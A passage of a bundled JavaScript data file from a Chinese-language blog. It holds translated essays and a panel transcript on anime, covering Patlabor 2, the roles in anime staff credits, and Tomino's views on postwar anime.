人發生了什麼變化。</p>\n<p>在《RE-TAKE》的世界裡，真嗣和明日香原諒了彼此，然而在紅海岸邊的真嗣和明日香，與那個世界裡的真嗣和明日香是不同的存在。並且如同上述的，在《RE-TAKE》世界裡所發生的事情，應該是不會影響到本篇的。</p>\n<p>但是之後真嗣自明日香身上離開，背對她縮坐著。明日香也走到真嗣背後，取下繃帶。在《RE-TAKE》世界裡真嗣與明日香的互相理解，真的帶來了某些變化。</p>\n<p>我想，這可以說是進行二次創作的人，所會擁有的願望、希望、祈禱一類的東西吧。</p>\n<p>話雖如此，《RE-TAKE》世界的真嗣和明日香，與紅海岸邊的真嗣和明日香終究是不同的存在，影響也是極小程度的。所以最後，兩人互相原諒的，也僅是在最後一格畫面裡，重合的那一根小指的程度吧。</p>\n<hr>\n<p>要說二次創作的弱點是什麼，就是無法接受某部作品的結局，想試圖改變它時，卻因為改變過頭，而無法認知到自己試圖去拯救的角色，其實也正試圖在拯救自己。以及讓劇情發展得太順利，反而導致自己無法接受的現象，而產生「即使我這麼做，真正的 ○○ 仍然…」的想法。</p>\n<p>在這種時候，真的會產生非常強烈的無力感。</p>\n<p>但我認為《RE-TAKE》是部將重點放在，保有能讓《EVA》粉絲接受的說服力，賦以細緻的注意所作出的作品。畢竟要是提出膚淺的結局，連作者自己也會難以接受吧。</p>\n<p>而這成功了嗎？至少對我來說是大成功。</p>\n","date":"2019-02-13T07:16:58.000Z","excerpt":"","printDate":"February 13, 2019","printReadingTime":"1 min read"};

var route_36 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod35
});

var Mod36 = {"title":"【譯】活在〈虛構的都市〉裡的真實——《機動警察 Patlabor 2 The Movie》感想","slug":"ACG-truth-of-living-in-the-city-of-imaginary-patlabor-movie-2","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://amberfeb.hatenablog.com/entry/2014/08/21/231924\">〈虚構の都市〉を生きるというリアル――『機動警察パトレイバー 2 the Movie』感想</a></p>\n<hr>\n<p>前幾天我寫完機動警察 1 的文章後，恍然地思考著關於其續篇的《機動警察 Patlabor2 The Movie》。在裡面描繪的東京是什麼，以及這個東京，在拓植行人這個男人眼中看來是如何的，並且想要如何去改變這個東京。想將我所思考的這些東西寫下來。</p>\n<h2 id=\"〈虛構〉的都市，東京\">〈虛構〉的都市，東京</h2>\n<p>本作《機動警察 Patlabor 2 The Movie》的舞台是，2002 年冬天的東京。作品上映的時候是 1993 年，所以是有些前方的未來，也就是近未來。但是，裡面所描寫的東京的樣貌，真的是近未來的東京的樣貌嗎。我不這麼認為。所以，比起認為本作的舞台是「近未來」的 2002 年，以在上映的當時「1993 年的真實性的反映」的 2002 年，這樣的看法會更加妥當吧。1990 年代前半，東京是做為什麼樣的都市為人所認識的呢。為了找出其中的脈落，有必要先稍微離開電影繞點路。</p>\n<p>要定位 1990 年代這個時代，確認歷史定位是有意義的。因此，我參考了社會學者．見田宗介的看法。見田指出現實（Reality）存在著 3 種反義詞。＜理想與現實＞、＜夢與現實＞、＜虛構與現實＞。見田認為根據這 3 個詞彙，能夠將戰後、1945 至 1990 年代初期的時代區分成三種。從 1945 年到 60 年代是理想的時代。60 年代到 70 年代前半是夢的時代。以及，70 年代中期到 90 年代是，虛構的時代。</p>\n<p>關於虛構的時代，見田是這樣說的。</p>\n<blockquote>\n<p>替 1980 年代的日本，尤其是其城市添上特色的，是朝著真實的「脫臭」漂浮的＜虛構＞的話語、表現、生命的技術。</p>\n<p>見田宗介『現代日本的感覺與思想』p11</p>\n</blockquote>\n<p>〈虛構〉。在《機動警察 Patlabor2 The Movie》這部作品裡重複出現的主題。雖然虛構這個詞本身，在作品裡大概一次都沒有出現過，但是虛構的飛彈、幻之轟炸機、不確定的和平…。</p>\n<p>以及虛構的都市，在恐怖份子拓植最後如何看待東京的告白裡其存在也相當地明確。</p>\n<blockquote>\n<p>「從這裡望去，那座城市看起來就像是海市蜃樓。你不這樣認為嗎」</p>\n</blockquote>\n<h2 id=\"拓植的真實和「東京」的真實\">拓植的真實和「東京」的真實</h2>\n<p>「從這裡望去，那座城市看起來就像是海市蜃樓」。拓植所說的「這裡」，很明顯地指的並不是實際上的所在地，18 號掩埋場。拓植站著的地方，是在 PKO 所經歷過名為戰場的地獄，究極地迫近身體的真實。由經驗所累積起的「現實」。</p>\n<p>對於體驗過名為戰場這究極的真實，並在其中失去了許多事物的拓植來說，東京這座都市的虛構性已經是種令人難以忍受的空洞之物吧。將〈虛構〉的都市，置放於究極的現實「戰爭」裡，並奪取其真實性。這正是恐怖份子，拓植行人的目的。</p>\n<p>向東京的虛構性挑起戰爭，在這點上，我認為拓植和前作《機動警察 Patlabor The Movie》試圖阻止東京開發的，帆場暎一有著共通的地方。</p>\n<p>但是帆場和拓植，有著決定性的不同。帆場用來做為〈虛構的都市〉的對照物，是「舊時美好的東京」。他移動的足跡，正是最好的證明。帆場想以在那裡生活著的人們的真實，揭開〈虛構的都市〉東京的虛構性。但對拓植而言從前的東京並不存在，他透過展現「地獄的戰場」，試圖將這份虛構破壞得體無完膚。</p>\n<p>在帆場的戰略裡，確實是存在著能夠支持其方向的東京。即使那是將要消逝之物，「舊時美好的東京」有著實在的真實性。但以「戰場的展現」為目標的拓植的戰略，卻缺乏著真實性。東京的確在戰爭時期經歷了美軍戰鬥機的轟炸。但那並不是能與拓植的「戰場」有所連接的。</p>\n<p>曾經親身體驗過究極的現實的拓植，卻因而與東京的真實性相離得更遠。這個悖論的揭露正是本作的最高潮。連接東京與戰場的不可能性，透過了同是在東京的現實裡活著的住人之一南雲的嘴裡述說出來。</p>\n<p>即使如此仍要在〈虛構〉裡活下去。</p>\n<blockquote>\n<p>柘植「從這裡望去，那座城市看起來就像是海市蜃樓。你不這樣認為嗎」</p>\n<p>南雲「即使只是幻象，在那座城市裡仍有將其當成現實而活著的人們。還是說這些人在你眼中看來也是幻象嗎？」</p>\n<p>柘植「3 年前，回到這座城市的我也活在那份幻象裡。並且試圖告訴眾人那是幻象，最後直到第一發槍聲響起之前仍然沒有任何一個人注意到。不，也許現在也仍然沒有」</p>\n<p>南雲「現在正站在你面前的我，並不是幻象啊」</p>\n</blockquote>\n<p>即使只是〈虛構的城市〉，仍有將這份虛構當成真實活著的人們。他們的身影在照映著都市的攝影機裡無一不漏地被描繪著。忽視了即使身在虛構裡仍然活著的人們。完全不願望向他們。這正是拓植決定性的失足，曾經活在「地獄的戰場」裡的悲劇，造就了他命運性的狹窄視野。</p>\n<p>機動隊試圖突入拓植身在的 18 號掩埋場所使用的戰略，也能看做是對於拓植的思想的對立命題吧。他們所使用的侵入路線，「幻之新橋站」。在昭和 18 年便被關閉，是在如同「海市蜃樓」的〈虛構的都市〉裡的古代層，做為真實性的象徵的同時，也被加上了和虛構重疊的概念的形容詞「幻之」。存在在於如同海市蜃樓的東京裡確切實在的真實，在這裡明確地表現出來，其正是拓植粗暴地展現的「戰場的真實性」的對立存在。而以其做為突破口，在東京裡活著的人們的真實性，凌駕於拓植的「戰場的真實性」之上，並諷刺地揭露出那也仍只是其中一種〈虛構〉。</p>\n<p>追隨拓植的人們的想法，在作品中並沒有被提及。若是要去類推的話，也許正是對於活在〈虛構〉裡感到疲憊，想要奪取「真實性」的欲望，使得他們與拓植踏上了同樣的道路吧。或許在〈虛構的都市〉裡，人們的內心裡都潛藏著這樣的欲望。</p>\n<p>在這部作品上映 2 年後，於都心引發前所未見的恐怖事件的奧姆真理教信徒們的心性，也許也和這重疊了。或許可以說經由那次事件，這部作品也在某種層面上發揮了預言現實的機能。</p>\n<p>與遵循奧姆真理教的理念策畫了恐怖事件的人們，是不可被原諒的犯罪者，並且沒能在所實踐的行為裡找出社會性的意義一樣，拓植的同情者們的行動，亦只是試圖去抓住空氣般的空虛作為。對於活在〈虛構〉裡感到疲憊，並且為了打破這個狀況而試圖處身於「戰爭」這種極限狀況裡的跳脫思考。仍然只是同樣是沉醉於〈虛構之中〉，後藤如此地道破。</p>\n<blockquote>\n<p>「荒川先生，你所說的東西很有趣。充滿著欺瞞的和平和做為真實的戰爭。但就如你所說的若這座城市裡的和平是虛假的，他們所創造出的戰爭也是虛假的。這個城市啊，對於真實的戰爭來說太過狹小了」</p>\n<p>「戰爭一直都是不現實的。戰爭從來沒有一次，是帶有現實性的」</p>\n</blockquote>\n<p>後藤所說的，對於過去的南斯拉夫和現在的巴勒斯坦，在實際流著血的地方所活著的人們來說，也許只是胡扯虛設。但這也是對於戰後出生於東京，並且活著的人們來說其中一面的「真實」。</p>\n<p>不，不只是戰後，也許對於東京來說戰爭從未帶有現實性。若是沒有大東亞共榮圈或萬世一系這樣的虛構內容，就無法談論過去的侵略戰爭了吧。在戰爭的背後，或多或少都有著虛構的「理想」。因為若不是如此就不可能活在名為戰爭的現實裡了。這樣一想，反對「戰爭是現實的」的後藤的主張似乎也能看為是更加帶有普遍性的。</p>\n<p>而以其他的「現實=真實性」，揭露都市與在裡面生活的人們的〈虛構〉的嘗試，本身也會因此失去真實性的臭味，並不得不再次提起其它的〈虛構〉。拓植的計畫遠離了原本的意圖，並且無法避免地使得打破〈虛構〉的不可能性變得明確。不是去打破〈虛構〉，而是在裡面真實地活著。也許這才是真正的在都市裡活著。</p>\n","date":"2019-01-26T07:22:16.000Z","excerpt":"","printDate":"January 26, 2019","printReadingTime":"1 min read"};

var route_2 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod36
});

var Mod37 = {"title":"【譯】一次看懂動畫的製作人員名單","slug":"ACG-understanding-staff-of-anime","html":"<p>本文取自設計雜誌『MdN』2017 年 4 月號的「アニメのスタッフ・クレジットから読み解けるもの」專欄訪問影像導演篠田利隆，以《亞人醬有話要說》為例解說製作人員職位的內容</p>\n<h2 id=\"監督\">監督</h2>\n<p>監督是為了讓整個作品的製作人員保有共同視野而進行指示的人。並且針對來自製作人員提交上來的各種提案例如腳本、繪分鏡、演出、作畫、世界設定等基於此視野給出最終 OK ，或是若從視野上偏離開來則委託修正的人。</p>\n<p>總之動畫的導演很忙。也有些電視連載的動畫第一話的繪分鏡會是由導演來畫的 ⋯…我身為影像導演畫 5 分鐘的音樂影片的繪分鏡就要花上一個禮拜。這樣一想要畫一集 30 分鐘（本篇約 25 分鐘多）的繪分鏡會需要多少勞力。同時還要檢查來自製作人員提交上來的東西，以及各式各樣的討論。導演必須要做從作品進入入口到出口之後的完成檢查，是個作業量很龐大的工作。</p>\n<h2 id=\"系列構成\">系列構成</h2>\n<p>作品系列構成是，例如電視動畫一季會有 12 集，為了要能夠在這樣的集數下吸引住觀眾，去思考腳本構成的人。思考各話是要寫成起承轉合的故事，或從一開始就秀出結尾，我認為故事的有趣與否是決定在系列構成的手腕。簡單來說我是將這個職位當成腳本這個領域的監督。而擔任系列構成的人通常自己也會負責數話的腳本。</p>\n<h2 id=\"演出\">演出</h2>\n<p>電視動畫來說演出會有自己所負責的集數，演出要進行其中許多部份的檢查。例如「長度」方面的部分。檢查完成的繪分鏡長度是否確實符合。或是看由繪分鏡完成的 layout 是否沒問題，並交給作畫監督。通常擔任製作現場的中間人角色，也經常會自己負責核心的繪分鏡演出。可以說是監督的副手職位。</p>\n<h2 id=\"製作進行\">製作進行</h2>\n<p>管理成本與時間的人們。立場上是在製作人底下的職位。為了讓作品製作能順暢地進行在現場處理溝通、調整，管理行程。 若在哪個部分開始拖到，就會造成整體的延遲，負責與其他部門的人討論並進行調整，在像動畫這樣有許多人參與製作的作品是非常重要的。</p>\n<h2 id=\"角色設計\">角色設計</h2>\n<p>進行作品所需要的角色設計的工作。但是動畫裡的角色要具有魅力是理所當然的，更重要的是轉化成影片後能夠好好地動起來的設計。由於會有許多動畫師參與作畫，不會造成偏差的設計是很重要的。</p>\n<p>最近的動畫則有很多情況是有漫畫的原作，或是由漫畫家、插畫家經手角色原案，也會是非從零開始設計，而讓其能夠動畫化的職位。無論如何，這可說是個決定動畫裡的角色看來是否有魅力的重要職位之一。</p>\n<p><img src=\"https://i.imgur.com/eAnsQiG.jpg\" alt=\"page 1\"></p>\n<h2 id=\"原畫\">原畫</h2>\n<p>繪畫畫面的設計圖「構圖 (layout) 」，以及動畫關鍵的圖幀 (關鍵幀) 的部門。並引出畫出其中中間幀的動畫師的繪畫品質。在這層意義上，原畫在動畫製作上也是非常重要的部門。</p>\n<h2 id=\"作畫監督\">作畫監督</h2>\n<p>簡稱作監。檢查原畫的品質 (作畫是不是有崩、是不是有遵照角色設定的設定畫描繪、等等) ，需要時會加上修正。有些情況下的修正會讓人覺得幾乎是整張重畫了？我認為是大幅影響品質的重要職位。電視動畫通常會有數位作畫監督，以及在其上擔任統整職位的總作畫監督。</p>\n<h2 id=\"動畫\">動畫</h2>\n<p>描畫原畫的人畫的關鍵幀中間的幀 (進行中割) 的部門。也被稱作是動畫人。角色是由動畫人做了中割後，才會變成一連串的動畫。</p>\n<p>個人來說我很常認為動畫、原畫、作畫監督這幾個職位是生死與共的。以及動畫和原畫的作畫作業仍然是以紙和鉛筆為大宗，而非數位作畫。而每一枚畫仍然是由人力所畫的也令我感到驚訝。</p>\n<p>另外動畫也有品質檢查和進行修正的職位。也就是動畫檢查這個職位。</p>\n<h2 id=\"第二原畫\">第二原畫</h2>\n<p>第一原畫的人們所負責的是構圖和線稿的原畫。而進行清線的是第 2 原畫的工作。可以說是輔助原畫的職位。我想也是只有動畫才會分工得如此精細。</p>\n<h2 id=\"色彩設計\">色彩設計</h2>\n<p>詢問監督的意見與方向，並企畫出能反映出世界觀的角色的顏色。頭髮、肌膚、瞳孔、衣服、陰影部份等等一連串的顏色設計。偶爾也會有必要對某個角色進行早上時的光線、日常的光線、夕陽時的光線等等複數的設計。</p>\n<h2 id=\"色指定\">色指定</h2>\n<p>負責色彩設計的人製作顏色的指定資料，色指定則遵照這份資料指定各個場景的顏色。實際上在色彩設計時沒有指定到的小物件出現時，也會由色指定直接進行色彩的指示。</p>\n<h2 id=\"著色\">著色</h2>\n<p>實際進行著色的職位。通常也被稱為「仕上げ (完稿) 」。僅是角色的色彩部份也會如此進行分工制，分成「色彩設計」、「色指定」、「上色」。</p>\n<p><img src=\"https://i.imgur.com/jEQXOMc.jpg\" alt=\"page 2\"></p>\n<h2 id=\"美術監督\">美術監督</h2>\n<p>負責理解監督的意向，並在背景表現出作品的世界觀的就是背景美術。美術監督則是總管背景美術的職位。在進入背景美術的作業前，通常會將與監督討論和作品的背景概念畫成大略的美術板。透過美術板可以成功讓背景製作人員畫出擁有統一感的世界觀背景。</p>\n<p>現在觀看動畫作品的人，流行前去拜訪原形地點的「聖地巡禮」。因此可以說是變成比以前更重要的職位。</p>\n<h2 id=\"攝影監督\">攝影監督</h2>\n<p>在以往的賽璐珞動畫時代，是將畫好的背景素材和角色重疊在攝影台上，逐格交換賽璐珞畫進行攝影的。這時也會進行如穿透光線的演出。而在轉移至數位製作的現在已經幾乎不會用這樣的作法了。相對地會將素材組件化、並使用能加上同樣效果的程式如 After Effects 進行相同的作業。完整活用數位製作的特性，模糊深部重現出鏡頭深淺的光學表現、做出逆光的效果也變得簡單了。</p>\n<p>因此，現在仍將將背景素材和角色合成，並加上特殊效果的作業稱作「攝影」。而統整管理的是攝影監督。</p>\n<h2 id=\"道具設計\">道具設計</h2>\n<p>負責作品裡出現的小道具設計。動畫作品和以前比起來，比起「異世界類型」多了更多和我們生活的日常的世界觀是相連的作品。同感性比以前被更加重視。因此零散的物品也不再是稀奇古怪的東西，而變成必須要是擁有洗練而時髦的設計。我想這也是會需要物品設計 (Prop Design) 的理由。順帶一提物品設計在我主要活躍的 MV 和 CG 的實景世界裡是由「美術」所負責的。在拍攝廣告的 Still (靜止照片) 時可能是「 Stylist 」的范籌。我覺得在動畫、 廣告 、靜止照片等等不同的項目裡有不同的說法挺有趣的。</p>\n<h2 id=\"特殊效果\">特殊效果</h2>\n<p>指如放出魔法般的光束這一類的特殊效果。也經常被略為「特效」。</p>\n<p><img src=\"https://i.imgur.com/VRMlojB.jpg\" alt=\"page 3\"></p>\n<h2 id=\"cg-監督\">CG 監督</h2>\n<p>現在即使是賽璐珞色調的動畫也會在許多地方使用 CG 。背景的 CG 使用率也變多了。也會順著永近構圖融進背景裡。近年的機器人動畫大部份也是使用 CG 。車也是。這些 CG 的部份是由 CG 監督所進行監導。</p>\n<h2 id=\"標題設計\">標題設計</h2>\n<p>大概是在這 10 年左右吧，動畫作品也開始以能在既存的粉絲外獲得人氣為目的，有了更多洗練的標題設計。標題設計的重要性是，能夠看標題就想像得到這會是什麼風格的動畫。已經可以說是 CI (Corporate Identity，企業識別)性的。像是在看動畫的第一集，片頭曲播放後約 15 秒至 30 秒會出現標題，期待值也會因為標題而大幅上下 (笑) 。</p>\n<p>雖然編輯並不太受人注目，但非常的重要。編輯要考量這個作品所要的東西，並進行將各個段落連接起來的作業。僅聽這樣的說明可能會覺得並沒有那麼地重要，但作品的印象會因為編輯而有大幅的不同。例如節奏感之類的。</p>\n<p>戰鬥類型的動畫作品則要快速地連接，像這部「亞人醬有話要說」的作品，則是要以稍遠的背影接得較長並能感動人心的剪輯方式進行。雖然我想在作畫的階段就已經某個程度上決定長度了。</p>\n<h2 id=\"音響監督\">音響監督</h2>\n<p>音響監督我想則大多是負責監督聲優們的演技。音響監督會替聲優們加上演技。動畫來說會在「還沒有畫的階段」就要做出演技了。在只有原畫的階段和分鏡的階段，我認為音響監督和聲優的默契，創造出了動畫的團隊感。</p>\n<h2 id=\"音響效果\">音響效果</h2>\n<p>音響效果和「音響監督」在字面上有些類似，但其實是相當不同的工作。可以說是負責製作聲音的特殊效果的人。像是戰鬥裡刀刃相交的聲音，或是走路時靴子的聲音等等。</p>\n<p><img src=\"https://i.imgur.com/xld3vAb.jpg\" alt=\"page 4\"></p>\n","date":"2019-01-23T06:56:18.000Z","excerpt":"","printDate":"January 23, 2019","printReadingTime":"1 min read"};

var route_24 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod37
});

var Mod38 = {"title":"【譯】戰後動畫描寫了什麼","slug":"ACG-what-does-anime-describe-after-war","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://note.mu/masashi3122/n/naef51e9b3569\">https://note.mu/masashi3122/n/naef51e9b3569</a></p>\n<hr>\n<p>富野：我討厭自我介紹。我正處在用修辭整理事情的人群裡。這本書雖然很厚，但講的東西只要其一半的量就夠了。到這種地方來是老人的任務。因為這本書而被圍攻，真是難為情啊。動畫是沒辦法當成哲學的對象的！要用言論來做生意還真是辛苦哪。</p>\n<p>宇野：書會變長都是因為監督您的關係啊。</p>\n<p>富野：囉嗦。</p>\n<p>（之後，兩人持續拌嘴）</p>\n<p>宇野：監督您總是說著「我終究就是個做機器人動畫的」在逃避著，卻也擅自做了許多事情呢。</p>\n<p>富野：一旦那是工作就算怎麼碎念也必須要去做。我帶著不久就要死去的意識在工作著。沒辦法用修辭去工作的原因是，在我死後也會被評論。所以也把這點放在思考範圍裡工作著。</p>\n<p>福嶋：宇野總是想用挑釁來推動狀況。</p>\n<p>宇野：我想在全球化的現況裡放入戰後動畫。從外側。放進戰後日本、獵奇的日本。現在要突破處在死胡同裡的日本，最需要的是動畫和富野。裡面描寫著人最惡劣的一面。並且預測著現在。</p>\n<p>富野：我沒有用這樣的論點在思考著。那就是世俗性的，（為了販賣玩具的）23 分鐘左右的廣告。但只有這樣是不夠的才進行了「造語」。我也沒有去思考現實主義。那只是種手段。是為了生活。以結果論來說才會有現在。自動畫得到想法。和我同世代裡的動畫創作者並沒有有著作品論的人。但我也不是毫無計畫地做了 40 年的笨蛋。我不會去回顧以前的作品。因為看了以前的作品就會使自己老去。所以這次讀了這本書我把提到我的部份節錄了出來。有著劣化的人。這會變成仇恨言論。因為是機器人動畫所以才不會變成仇恨。這樣一來就完全無法判斷了。我將生命連繫到了現在。話語也劣化了。活著並不是件半調子的事情。我想起在機動神腦時曾經講過「不必你拜託我也會回下去」。會加上「活下去」的複製就是劣化的象徵。</p>\n<p>國分：並不是思想性的而是商業性的。雖然是預測但也不會僅只是預測。這不是在這種商業的規範裡所產生的思想裡會誕生的東西。</p>\n<p>宇野：所謂的大眾文化就是這種東西啊。呼應著大眾的要求。</p>\n<p>富野：這的確和思想不一樣。我無法說明。</p>\n<p>宇野：該說是，觸感嗎。</p>\n<p>富野：現在我對機器人作品有著執著。</p>\n<p>福嶋：影像作家留下了許多生動的話語。</p>\n<p>富野：宇野曾寫過「動畫是純淨的，能夠將一個人的思考化為形體」。是無法透過演員表現出來的。因為是動畫才做得到，動畫是種高性能的媒體。</p>\n<p>福嶋：動畫的歷史就是作家性變得越來越強。</p>\n<p>宇野：21 世紀的人將 20 世紀製作的戲劇電影當成教養。現實是（其做為個人體驗）無法分享的。而能夠輕易分享這份幻想的便是影像的動畫。</p>\n<p>富野：我沒有異議。但若是透過思想去認知動畫，並只用這個視點去看動畫的話。沒有意義。民族主義是無法構成畫面的。迪士尼一直在做著同樣的東西。市場、民粹主義、小孩。這被世界上 3 分之 1 的人們接受並享受著。而在宇野的書裡並沒有提到。天真的迪士尼有什麼不好的。</p>\n<p>宇野：他們是被迪士尼的宣傳動畫調教的愚民。世界上另一半的人是透過 Google 看見世界並按「讚！」以為自己知道了世界。在其中間有著的就是戰後動畫。我以過去形表現了「曾經存在過戰後動畫」。這點對 G 復國也是一樣的。那是刻意做成讓人很難理解的吧？</p>\n<p>富野：是的，確實是這樣。做電影版是因為將失落的部份填補起來可能會更像部作品。G 復國沒辦法做劇情摘要。G 復國是五部作。如果兩個月前就和美術討論的話大概就能做了。認為 G 復國是鋼彈的人絕對無法理解。青少年們也在看著。這和我在（初代）鋼彈時的反應一樣。不要拿鋼彈來作戰記故事的複製品。</p>\n<h2 id=\"「不要拿鋼彈來作戰記故事的複製品」\">「不要拿鋼彈來作戰記故事的複製品」</h2>\n<p>福嶋：『鋼彈』和『進擊的巨人』對亞洲的學生運動造成了影響。所以現在才有必要將其語言化。</p>\n<p>宇野：動畫是畸形兒、戰後動畫的插花。其歪曲就是宮崎、富野、押井。</p>\n<p>福嶋：我在以近親相姦式的作品分析著（戰後動畫），但對海外的人來說會很難理解吧。缺乏大人的戀愛。</p>\n<p>富野：母性是日本性的東西嗎？</p>\n<p>國分：（富野的動畫）不好懂是從以前就如此了。觀看著也在苦苦掙扎試圖抓取的戲劇。富野世代雖然是政治性質的其感受性卻很優秀。現在這變得廉價了。（宇野的）書讓我失望的是，只到了讓富野在次個世代裡活躍就結束了。沒有再寫下後續。用「母性」之類的話語總結，僅此而已。</p>\n<p>富野：母性是日本性的嗎？不是全球性的嗎（福嶋 是指家庭的看法嗎）。我對於宇野的論述並沒有怪異感（ 宇野 因為是從您學來的 → 會場爆笑）。但是，將這套到所有的領域上是不對的吧。Google 一類的也是。所以即使（宇野）想要挑舋，也沒有看向對手。</p>\n<p>宇野：戰後動畫就是為什麼人要駕駛機器人。那並不是肉體的延長，而是思春期的精神動盪。動畫裡不會描寫政治和戰爭。所以我對那沒有興趣。</p>\n<p>富野：的確普通人只會對男女關係有興趣。所謂的娛樂就是這樣的。人們對於機器人不會有興趣。因為是機器人所以才無法理解。</p>\n<p>宇野：現在機器人已經結束了。</p>\n<p>富野：為了要贏過 Google 必須要讓男女關係復活。</p>\n<p>宇野：Google 也不是完全的。但是戰後動畫曾經消滅過一次，我認為現在一定要讓它復活。</p>\n<p>國分：幽谷放到現在來說就是恐怖組織。這點也是預知。看的人會想著他們在進行的是政治或戰爭。90 年代讀了『沉默的艦隊』自以為瞭解了世界的人也腐敗了。真．哥吉拉要怎麼去認知？</p>\n<p>宇野：90 年代的都市型御宅族、讀著 Comptiq 的御宅族找不到政治的感性。</p>\n<p>國分：看了鋼彈就會變成網路上的右翼酸民嗎。我不認為。若是鋼彈裡沒有政治性的東西才會變成網路右翼酸民吧。</p>\n<p>宇野：正是因為御宅族無法消化這點。『Zeta』沒有人氣、反而是『Dirty Pair』獲得了熱度。這就是御宅族。所以『0083』才會大賣。那種完全沒有內容的東西。就是那種東西產出了網路右翼酸民。</p>\n<p>富野：那跟我沒關係 （會場爆笑）。這不是這種這麼熱血的東西。諷刺性地來想日本的政治就是這樣的。</p>\n<p>福嶋：在政治的訊息浮現裡頭，有著男女的關係。</p>\n<h2 id=\"後半\">……後半</h2>\n<p>宇野：被單純化的政治運動、因為沒有其他人所以投給安倍，這樣是完全不行的。網路右翼酸民是種卑賤的想法而連政治都稱不上。所以 80 年代以新人類來說要怎麼樣才好，資訊化、Google 性、或是伊甸。這只會變成治癒論。所以是在政治上有著不可能性的動畫論。</p>\n<p>宇野：「伊甸既是類補完計畫，也就是 Google 性（集合意識）」</p>\n<p>國分：確實有著卑賤性。其實我很喜歡『丹拜因』，裡面有的不是階級社會而是身份的社會。描寫著身份制的秩序。年鑑學派也有著被現代社會的卑賤性所包覆時的精神性貴族社會的卑賤性與身份制。</p>\n<p>富野：雖然我並不在意，不過我方才聽來的卑賤也像是治癒。卑賤與治癒。這大概是並列的。（我是）認同身份的人。高貴的義務精神是重要的。卑賤的傢伙是沒有志向的。雖然我覺得有階級制度是可以的，但它從沒有好好地發揮過機能所以不行。我們的世代並沒有承繼上個世代的知性。統治並沒有持續到戰後。沒能創立出帶有這樣知性的社會。知識份子們並沒有想到這點。幾乎忘記了知識的使用方式。這是想要再次建立知性的存在方式的老人的妄言。身為一個動畫創作者，使用公眾的訊號發言，會想要是知性的。戰後的 SF 都很無聊。試圖去做出良質品的知性。缺乏這點就會駑鈍。擁有革命性精神的人不會認為自己是卑賤的，熱中於馬克斯列寧的習進平。透過黨的綱領的話語將精神化為真實。那麼，知性到底是什麼呢。將這樣的視點著附於身的就是『伊甸巨神』之後的新人類論。</p>\n<p>宇宙巴比倫揭立了宇宙貴族主義，但並沒有明說這股思想是否敗北、衰退，反而在『V』裡也出現了接受其的描寫。</p>\n<p>福嶋：漢娜·鄂蘭和『鋼彈』都是難民。思想會從其處誕生。</p>\n<p>富野：從貧困的地方驅使知性向上爬。無法原諒否定戰後。強加於人的憲法論也不行。麥克阿瑟身為職業軍人，試圖創造沒有軍隊的國家的思考價值是很重要的。雖然憲法是愚蠢的但我並不否定其價值。若是要做就要把整本憲法都改寫。軍隊應該要被認同。我認為這是所謂的知性。</p>\n<p>國分：知性的斷層很重要。戰前的知識份子感到慚愧。有著知識份子情結。</p>\n<p>宇野：鄂蘭的思想是承繼難民思想的知性。所以說自由的無力是戰後的弱點嗎。</p>\n<p>富野：8 月 15 日做為終戰紀念日往後稱做戰鬥。那是敗戰日。連紀念日都稱不上。而接受了其並逃避。結果就是安倍政權。在野黨也不是知識份子，已經墮落了。</p>\n<p>宇野：想要有著好品質，這樣想的人們來自於 70 年代的被歧視階級。生處於糟糕的環境。</p>\n<p>福嶋：猶太人也認為自己是「賤民」、選民。</p>\n<p>富野：動畫創作者不被認為是社會人士。税務署也不認為那是種職業。現在想想那也是歧視呢。</p>\n<p>宇野：戰後是遺忘的歷史。現在動畫也逐漸在成為遺忘的裝置。</p>\n<p>富野：感受度正在麻痺。影像和文學一樣在劣化著。</p>\n<p>福嶋：戰後日本對於將戰爭影像化是否定的。</p>\n<p>富野：雖然並不陌生，但在金錢和知性上都很貧乏。50－60 年代的電影不堪入目。只要把軍隊當成惡人就好，並沒有描寫戰爭。也沒有那麼多的才能。沒有黑澤明的後繼者。不能把『七武士』當成戰爭電影。反戰是好，但卻是一大堆反戰？的東西。那是知性工作的問題。電影界並沒有注意到這點。</p>\n<p>福嶋：而動畫試圖去描寫這點。</p>\n<p>富野：也許是種代替，但在自我意識上並沒有到那種程度。</p>\n<p>宇野：史匹柏的戰爭是幻想。和 SF 一樣。而監督則試圖以 SF 描寫戰爭（富野 對於除了『辛德勒的名單』以外的史匹柏戰爭電影，尤其是以提及第一次世界戰爭的電影為攻擊目標的宇野說「因為史匹柏也是在工作」）。在幻想裡究竟真的能有多受傷。安彥的鋼彈是知識份子。所以是經歷過全共鬥時代。大叔們的酒後話題。過往事跡。也不像『虹色的托洛斯基』一樣扎實。所以故事到那裡就結束了。</p>\n<p>福嶋：史匹柏是職業的。不是導演。他有必要讓工作人員們溫飽。所以是知識份子的問題。為什麼在野黨只有那種程度呢。</p>\n<p>宇野：也就是只能去做幻想類作品。只有富野監督作得到，沒有下一個人了。</p>\n<p>富野：所以為了做出下個動畫的方向我會一直做到死。若不如此動畫就會死。會失去意義。我想要成為向企業挑戰的大成。我想向演講人講的是，我希望你們向下個世代的人丟出 Goolge 性的問題。立起旗子。要追隨年輕人對老人來說太懊腦了。但若是年輕人有著高品質的光輝那就會追隨。希望能長保那份光輝。</p>\n<p>國分：片尾曲與 4 季的播放期間。這對在海外的發展相當困難。相對之下宮崎的就很容易發展。Tristan Brunet 曾經說過，他完全不懂日文但反覆看了好幾次『Z 鋼彈』在學習著日文。能夠催生出像他這樣的人。並且傳開。為什麼監督沒有去做像宮崎那樣的工作呢。</p>\n<p>富野：有沒有作家性的差異吧。宮崎有但偏向哪邊是個謎。（宮崎）就只是個軍事喜好者吧。但不只是如此。他是個匠人。做的動畫是有原作的。我喜歡『風起』。因為我也喜歡飛機。當成紀錄片來看的。戰鬥機開發故事。而我也認為並認同那有著以電影來說的高度解析和作家性。</p>\n<p>宇野：（宮崎的下一部作品）作了『你們要怎麼活下去』相當有象徵性。岩波少年文庫類型的。那是戰後日本當成目標的未來，是中流社會，有著知飾份子子的社會。那時監督在 Sunrise 